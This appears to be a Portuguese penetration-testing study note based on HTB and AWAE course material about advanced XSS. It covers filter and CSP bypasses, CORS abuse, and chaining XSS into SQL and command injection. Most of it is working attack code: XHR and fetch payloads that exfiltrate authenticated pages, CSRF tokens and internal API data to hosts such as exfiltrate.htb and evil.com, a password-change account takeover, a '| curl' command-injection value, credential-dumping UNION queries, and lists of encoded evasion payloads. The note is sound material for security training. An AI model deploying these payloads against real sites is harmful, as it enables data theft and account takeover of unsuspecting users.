---
title: "Advanced XSS & Filter Bypass"
---

# XSS Avançado e Bypass de Filtros

> Fonte: HTB Senior Web Penetration Tester 2024 — Módulo 4: Advanced XSS and CSRF Exploitation

---

## A Falha: Sanitização Superficial Baseada em Blacklist

Quando desenvolvedores tentam mitigar XSS adicionando filtros — bloqueando `<script>`, removendo a palavra `javascript`, ou usando expressões regulares para detectar payloads conhecidos — eles estão resolvendo o problema errado. A falha não é que o usuário pode digitar `<script>`, a falha é que o output não é corretamente encoded para o contexto onde aparece. Filtros baseados em blacklist atacam o sintoma, não a causa.

A suposição de design errada é que "bloquear as tags perigosas conhecidas é suficiente". Isso só seria verdade se o HTML tivesse uma lista finita e imutável de formas de executar JavaScript. Mas o HTML5 tem dezenas de event handlers (`onerror`, `onload`, `onfocus`, `ontoggle`, `onmouseover`...) em qualquer tag HTML. Bloquear `<script>` enquanto permite `<img>` significa que `<img src=x onerror=alert(1)>` passa. Remover a palavra `onerror` leva o atacante a usar `OnErRoR` (HTML não é case-sensitive para event handlers). Para cada regra específica que o desenvolvedor adiciona, existe uma alternativa sintática que o browser interpreta identicamente.

O desenvolvedor cria essa falha por excesso de confiança na abordagem de blacklist: cada vez que um payload é detectado em produção, uma nova regra é adicionada. Esse ciclo gera uma ilusão de segurança. Filtros não-recursivos têm um problema particular: se o filtro remove `<script>` de `<scr<script>ipt>`, o resultado é `<script>` — o filtro criou o payload que tentava bloquear.

A abordagem correta é encoding contextual do output (o que não pode ser bypassado porque não é baseado em reconhecimento de padrões) combinado com CSP como camada adicional. Mesmo uma CSP bem configurada pode ser bypassada se confiar em domínios que oferecem endpoints JSONP — e esse documento cobre exatamente essas situações.

---

## Causa Raiz

O código vulnerável tenta sanitizar o input bloqueando padrões conhecidos em vez de fazer encoding do output:

```python
# VULNERÁVEL — filtro de blacklist é incompleto e bypassável
def sanitize(input):
    input = input.replace('<script>', '')
    input = input.replace('</script>', '')
    input = input.replace('javascript:', '')
    return input  # <img src=x onerror=alert(1)> passa!

# SEGURO — encoding contextual do output
from html import escape
def display(input):
    return escape(input)  # converte < > & " ' para entidades HTML
```

O padrão de código vulnerável em sanitizadores é: lista de strings/padrões proibidos que cresce incrementalmente. O padrão seguro é: encode tudo que não é HTML confiável, independente do conteúdo. A diferença é que o primeiro abordagem tenta identificar o que é "ruim" (impossível de fazer de forma completa), enquanto o segundo trata todo input do usuário como dado que nunca deve ser interpretado como código.

---

## XMLHttpRequest e Fetch: Requisições HTTP no Contexto da Vítima

Para explorar XSS e CSRF em aplicações modernas, usamos dois objetos JavaScript para fazer requisições HTTP a partir do contexto da vítima:

### XMLHttpRequest (método clássico)

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://exfiltrate.htb/', false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('param1=hello&param2=world');
```

### Fetch API (método moderno)

```javascript
const response = await fetch('http://exfiltrate.htb/', {
    method: "POST",
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'param1=hello&param2=world',
});
```

---

## Exfiltração de Dados com XSS

Quando a vítima possui um cookie `HttpOnly` (inacessível via `document.cookie`), ainda é possível exfiltrar dados fazendo requisições HTTP no contexto da vítima.

### Exfiltrar páginas internas

```javascript
// 1. Buscar a página no contexto autenticado da vítima
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

// 2. Enviar o conteúdo para o servidor do atacante (base64 para evitar problemas com caracteres especiais)
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

### Exfiltrar elemento específico do DOM

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var msg = encodeURIComponent(doc.getElementById('secret').innerHTML);
location = 'https://exfiltrate.htb/log?data=' + btoa(msg);
```

### Exfiltrar dados via POST (evita limitação de tamanho de URL)

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open('POST', 'http://exfiltrate.htb/exfil', false);
exfil.send(btoa(xhr.responseText));
```

### Atacar APIs internas (rede local da vítima)

```javascript
// API interna sem autenticação acessível via rede da vítima
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://172.16.0.2/data', false);
xhr.onload = () => {
    location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
};
xhr.send();
```

### Brute-force de endpoints de API via XSS

```javascript
var endpoints = ['access-token','account','accounts','admin','balance','credentials','data','login','password','profile','token','users'];

for (i in endpoints){
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', `http://api.vulnerablesite.htb/v1/${endpoints[i]}`, false);
        xhr.send();

        if (xhr.status != 404){
            var exfil = new XMLHttpRequest();
            exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(endpoints[i]), false);
            exfil.send();
        }
    } catch {
        // ignorar erros de CORS para endpoints que não existem
    }
}
```

---

## Account Takeover via XSS + CSRF

Quando um formulário de troca de senha é protegido por CSRF token, mas há XSS, podemos:

1. Ler o CSRF token via XSS (Same-Origin — sem restrição)
2. Usar o token numa requisição de mudança de senha

```javascript
// 1. Buscar o CSRF token da página de perfil
var csrf_xhr = new XMLHttpRequest();
csrf_xhr.open('GET', '/home.php', false);
csrf_xhr.withCredentials = true;
csrf_xhr.send();
var doc = new DOMParser().parseFromString(csrf_xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

// 2. Fazer o POST para trocar a senha com o token válido
var req = new XMLHttpRequest();
var params = `username=victim&email=victim@site.htb&password=pwned&csrf_token=${csrftoken}`;
req.open('POST', '/home.php', false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.withCredentials = true;
req.send(params);
```

Após o admin ativar o XSS, faça login com `admin:pwned`.

---

## Chaining XSS + Vulnerabilidades Internas

O XSS é executado no browser da vítima, permitindo atacar qualquer aplicação acessível na rede interna da vítima.

### Exploitar SQL Injection em aplicação interna via XSS

```javascript
// 1. Enumerar a aplicação interna
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();

// 2. Testar SQL injection (single quote)
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
// Resposta: HTTP 500 - SQL Error → confirmado SQLi

// 3. Bypass de login com SQLi
var params = `uname=${encodeURIComponent("' OR '1'='1'-- -")}&pass=x`;

// 4. Dumpar tabelas (SQLite)
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&pass=x`;

// 5. Dumpar credenciais
var params = `uname=${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&pass=x`;
```

### Exploitar Command Injection em aplicação interna via XSS

```javascript
// 1. Identificar o campo vulnerável (usa curl internamente)
var params = `webapp_selector=${encodeURIComponent("http://doesnotexist.htb")}`;
// Resposta: "curl: (6) Could not resolve host: doesnotexist.htb" → usa curl → pode ter command injection

// 2. Injetar comando adicional
var params = `webapp_selector=${encodeURIComponent("| curl http://exfiltrate.htb/pwn")}`;

// 3. Executar comando arbitrário
var params = `webapp_selector=${encodeURIComponent("| id")}`;
```

---

## CSP — Content Security Policy

### O que é CSP

CSP é um header HTTP (`Content-Security-Policy`) que instrui o browser a bloquear o carregamento ou execução de recursos que violem a política definida.

### Diretivas principais

| Diretiva | Descrição |
|----------|-----------|
| `script-src` | Origens permitidas para scripts |
| `connect-src` | Origens permitidas para requisições HTTP de scripts |
| `img-src` | Origens permitidas para imagens |
| `style-src` | Origens permitidas para CSS |
| `frame-ancestors` | Origens que podem embutir a página (prevenção de Clickjacking) |
| `form-action` | Origens para onde forms podem submeter |
| `default-src` | Fallback para diretivas não especificadas |

### Valores especiais

| Valor | Efeito |
|-------|--------|
| `*` | Qualquer origem permitida |
| `'none'` | Nenhuma origem permitida |
| `'self'` | Apenas a mesma origem |
| `'unsafe-inline'` | Permite JavaScript inline |
| `'unsafe-eval'` | Permite avaliação dinâmica de código |
| `nonce-VALOR` | Permite elementos com o nonce específico |
| `sha256-HASH` | Permite scripts com o hash específico |

### CSP segura (baseline)

```
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

---

## Bypass de CSP

### Bypass via JSONP

JSONP (JSON with Padding) é um mecanismo antigo que permite carregar dados cross-origin via tag `<script>`. O endpoint aceita um parâmetro `callback` e envolve a resposta com o nome da função:

```
GET http://someapi.htb/stats?callback=processData
Resposta: processData({'clicks': 1337})
```

Se a CSP permite scripts de um domínio que oferece JSONP (ex.: `google.com`), podemos usar o endpoint JSONP para executar JS arbitrário:

```html
<!-- CSP permite: script-src 'self' *.google.com -->
<!-- Bypass: -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
```

O parâmetro `callback` vira o nome da função chamada — que pode ser qualquer expressão JS válida.

Referência de endpoints JSONP: [JSONBee GitHub](https://github.com/zigoo0/JSONBee)

### Bypass via upload de arquivo JS

Se a CSP usa `script-src 'self'` mas a aplicação permite upload de arquivos sem validação de tipo MIME:

```bash
# Fazer upload de um arquivo .js disfarçado como imagem
# Depois carregar o script a partir da própria origem:
```

```html
<script src="/uploads/avatar.jpg.js"></script>
```

### Bypass via CSP configurada de forma fraca (origem ampla demais)

Se a CSP confia em `*.googleapis.com` ou outros CDNs grandes que têm endpoints JSONP controlados por terceiros, é possível injetar código via esses endpoints.

### Avaliação de CSP

Use o [CSP Evaluator](https://csp-evaluator.withgoogle.com/) do Google para identificar fraquezas numa CSP.

---

## Bypass de Blacklists de Palavras-chave

Quando a aplicação tenta bloquear palavras como `<script>`, `javascript`, `onerror`, `onload`, etc.

### Variação de capitalização (case mixing)

HTML e event handlers são case-insensitive:

```html
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
```

### Bypass de filtro não-recursivo

Se o filtro remove `<script>` mas não é reaplicado após a remoção:

```html
<scr<script>ipt>alert(1);</scr<script>ipt>
```

Após remover o `<script>` interno, o resultado é `<script>alert(1);</script>`.

### Bypass de regex que espera espaço antes de event handler

```html
<!-- Sem espaço: -->
<svg/onload=alert(1)>
<script/src="http://exploit.htb/exploit"></script>
```

### Tags alternativas para execução JS

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

---

## Bypass de Filtros de JavaScript — Encoding Avançado

Quando o código JavaScript está sujeito a filtros que bloqueiam palavras-chave:

### Octal encoding

```javascript
// "alert(1)" em octal dentro de eval
"\141\154\145\162\164\50\61\51"
```

### fromCharCode

```javascript
// Usando String.fromCharCode para construir "alert(1)" sem escrever o texto
String.fromCharCode(97,108,101,114,116,40,49,41)
```

Combinando com setTimeout para executar:

```javascript
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### Base64 via atob()

```javascript
// "YWxlcnQoMSk=" é base64 de "alert(1)"
Function(atob("YWxlcnQoMSk="))()
```

### Unicode escapes em strings JS

```javascript
// a = 'a', etc.
"alert(1)"
```

### Construir strings sem usar quotes

Se o filtro remove aspas (`"` e `'`):

```javascript
// Usar template literals (backticks) ou String.fromCharCode
String.fromCharCode(104,116,116,112,58,47,47,97,116,116,97,99,107,101,114)
```

---

## XSS via CORS Misconfiguration

Uma misconfiguration de CORS pode ser usada junto com XSS para ampliar o impacto:

### Arbitrary Origin Reflection

Se o servidor reflete qualquer valor do header `Origin` no `Access-Control-Allow-Origin` com `Access-Control-Allow-Credentials: true`:

```javascript
// Payload no exploit server — acessa dados autenticados da API
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
xhr.withCredentials = true;
xhr.onload = () => {
    location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
};
xhr.send();
```

### Improper Origin Whitelist (suffix match)

Se a API valida que o Origin *termina* com um sufixo específico (ex.: `vulnerablesite.htb`):

```
# O atacante pode usar um domínio como:
http://attackervulnerablesite.htb
```

### Trusted null Origin

Usando um iframe sandboxed, o browser envia `Origin: null` na requisição cross-origin:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
        location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
  </script>"></iframe>
```

### Bypass de CSRF Token via CORS Misconfiguration

Se CORS permite credenciais de qualquer origem, podemos:
1. Buscar a página com o CSRF token (Same-Origin bypass via CORS)
2. Extrair o token
3. Fazer o request protegido com o token válido

```javascript
// GET para obter CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

// POST com CSRF token válido
var csrf_req = new XMLHttpRequest();
var params = `promote=htb-stdnt&csrf=${csrftoken}`;
csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

---

## Bypass de SameSite via XSS em Subdomínio

Subdomínios são considerados **same-site** (mesma origem do ponto de vista SameSite). Se um subdomínio tem XSS, os cookies do domínio pai com `SameSite=Strict` ainda são enviados.

```bash
# Descobrir subdomínios vulneráveis a XSS
gobuster vhost -u http://vulnerablesite.htb -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
# Encontrado: guestbook.vulnerablesite.htb
```

```javascript
// No subdomínio: guestbook.vulnerablesite.htb
// XSS aqui faz request para vulnerablesite.htb com cookies SameSite=Strict
var csrf_req = new XMLHttpRequest();
var params = 'promote=htb-stdnt';
csrf_req.open('POST', 'http://vulnerablesite.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

---

## XSS Filter Bypasses — Alcançar Execução de JS

### Formas de alcançar execução de JavaScript

**1. Tag script clássica:**

```html
<script>alert(1)</script>
<script src="http://attacker.htb/exploit"></script>
```

**2. Event handlers em qualquer tag HTML:**

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**3. Pseudo-protocolo javascript: em hrefs e srcs:**

```html
<a href="javascript:alert(1)">clique</a>
<iframe src="javascript:alert(1)"></iframe>
```

### Bypass de blacklist básica — case variation

```html
<ScRiPt>alert(1);</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
```

### Bypass de regex com espaço:

```html
<svg/onload=alert(1)>
<script/src="http://exploit.htb/exploit"></script>
```

### Bypass de filtro não-recursivo:

```html
<scr<script>ipt>alert(1);</scr<script>ipt>
```

### Encodings de strings JavaScript para bypass de filtros

```javascript
// Octal
"\141\154\145\162\164\50\61\51"

// Decimal charcode
String.fromCharCode(97,108,101,114,116,40,49,41)
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))

// Base64
Function(atob("YWxlcnQoMSk="))()
```

---

## Detecção

### Identificar se há filtros ativos

- Enviar `<script>alert(1)</script>` e verificar se o alert dispara
- Enviar `<script>alert(1)</script>` e verificar no source se foi removido/escapado
- Testar variações de capitalização se o payload foi removido
- Tentar tags alternativas se `<script>` é bloqueado
- Verificar header `Content-Security-Policy` na resposta HTTP

### Analisar CSP

```bash
# Via curl
curl -I https://target.com | grep -i content-security-policy

# Ou via Burp Suite — Response Headers
```

Use o CSP Evaluator: https://csp-evaluator.withgoogle.com/

### Checklist de bypass

- [ ] Testar case variation: `<ScRiPt>`, `OnErRoR`
- [ ] Testar tags alternativas: `<img>`, `<svg>`, `<iframe>`, `<details>`
- [ ] Testar sem espaço: `<svg/onload=alert(1)>`
- [ ] Testar bypass de filtro não-recursivo: `<scr<script>ipt>`
- [ ] Se há CSP: identificar diretivas fracas (`*.google.com`, `'unsafe-inline'`)
- [ ] Verificar se há endpoints JSONP nos domínios confiados pela CSP
- [ ] Se CSP usa `'self'` para scripts: verificar se há upload de arquivos
- [ ] Testar encoding de strings JS: octal, fromCharCode, base64+atob

---

## Impact e Exploitation

### O que é possível com XSS avançado

1. **Bypass de HttpOnly** — não é possível roubar o cookie direto, mas XSS executa no mesmo contexto que o cookie, então pode fazer as mesmas ações que a vítima faria (ex.: mudar senha, exfiltrar dados)

2. **Bypass de CSRF Token** — via XSS podemos ler qualquer elemento do DOM da página, incluindo tokens CSRF hidden fields

3. **Bypass de SameSite=Strict** — usando XSS num subdomínio ou via client-side redirect

4. **Ataques à rede interna** — usar o browser da vítima como proxy para atacar serviços internos não acessíveis publicamente

5. **Chaining de vulnerabilidades** — XSS → SQLi, XSS → Command Injection, XSS → LFI em aplicações internas

### Ferramentas

| Ferramenta | Uso |
|------------|-----|
| XSS Strike | Scanner automatizado com bypass |
| Burp Suite Pro | Intercept, repeater, active scanner |
| JSONBee | Lista de endpoints JSONP para bypass de CSP |
| CSP Evaluator (Google) | Análise de CSP |
| PayloadAllTheThings | Listas extensas de payloads |
| XSS without Parentheses | Payloads sem parênteses |
| HTML 5 Security Cheatsheet | Exemplos específicos por browser |
| OWASP XSS Filter Evasion Cheat Sheet | Guia completo de evasão |

---

---

## DOM XSS — Vendor Library Hunting + XHR Exploitation (AWAE Ch.10)

### O Problema

Developers frequentemente incluem o diretório git completo de bibliotecas npm (com arquivos HTML de test/demo/perf) em vez de apenas o `.js` minificado. Esses arquivos HTML podem conter sinks perigosos que processam URL params.

### Descoberta via Wordlist npm

```bash
# baixar lista de todos os pacotes npm
curl -s https://raw.githubusercontent.com/nice-registry/all-the-package-names/master/names.json \
  | jq -r '.[]' | head -10000 > npm-top10k.txt

# bruteforce de /js/vendor/ com gobuster
gobuster dir -u https://TARGET/js/vendor/ \
  -w npm-top10k.txt -t 50 -o vendor_found.txt
```

### Identificar Versão e Baixar

```bash
# para cada lib encontrada, buscar README com versão
for lib in $(cat vendor_found.txt | grep "Status: 200" | awk '{print $1}'); do
  curl -s "https://TARGET/js/vendor/$lib/README.md" | head -5
done

# baixar versão exata do GitHub para análise local
```

### Hunting em Arquivos HTML das Libs

```bash
# buscar arquivos HTML dentro da lib
find ./vendor-lib/ -name "*.html"

# buscar sinks perigosos nos HTML
# sinks: innerHTML, outerHTML, insertAdjacentHTML, document["write"]
grep -rn "innerHTML\|outerHTML\|insertAdjacentHTML" ./vendor-lib/

# buscar sources que processam URL
grep -rn "location.search\|location.hash\|URLSearchParams" ./vendor-lib/

# sinks menos óbvios
grep -rn '\.html(\|\.append(\|\.prepend(' ./vendor-lib/
```

### Caso AWAE — lodash perf/index.html

Lodash incluído com diretório `perf/` completo. Em `perf/index.html`:
- JS carregado de `asset/perf-ui.js`
- Variável `buildPath` lida de `location.search` via regex: `?build=VALOR`
- `buildPath` passada para construção dinâmica de URL de script → sink

```
# payload:
https://TARGET/js/vendor/lodash/perf/index.html?build=PAYLOAD
```

### XHR Exploitation com HttpOnly Cookies

`HttpOnly=true` bloqueia `document.cookie` em JS, mas o browser ainda envia o cookie automaticamente em requests para o mesmo domínio. XSS no mesmo domínio pode:

```javascript
// fazer request autenticado e exfiltrar resposta
fetch('/api/dashboard', {credentials: 'include'})
  .then(r => r.text())
  .then(data => {
    // chunking para dados > 1024 chars
    var chunk = 1000;
    for (var i = 0; i < data.length; i += chunk) {
      fetch('https://evil.com/cb?d=' + encodeURIComponent(data.slice(i, i+chunk))
            + '&i=' + (i/chunk));
    }
  });

// extrair CSRF token de página protegida
fetch('/settings', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, 'text/html');
    var token = doc.querySelector('[name=csrf_token]').value;
    // usar token para forjar request autenticado
  });
```

**Infraestrutura de exfiltração:**
```python
# servidor simples para capturar dados
python3 -m http.server 8080

# Flask + SQLite para dados estruturados (múltiplos chunks)
from flask import Flask, request
app = Flask(__name__)

@app.route('/cb')
def capture():
    d = request.args.get('d', '')
    i = request.args.get('i', '0')
    # gravar chunk em DB para reconstrução posterior
    return 'ok'
```

---

## Módulos Relacionados

Os fundamentos de tipos de XSS e payloads básicos estão em [`01_xss_fundamentos.md`](01_xss_fundamentos.md), que estabelece a base sobre a qual as técnicas avançadas deste módulo operam. O módulo [`03_csrf.md`](03_csrf.md) detalha CSRF, que o XSS avançado frequentemente encadeia para executar ações autenticadas. O módulo [`04_prototype_pollution.md`](04_prototype_pollution.md) aborda prototype pollution como gadget para XSS client-side, uma das técnicas de vetor alternativo coberta neste módulo.
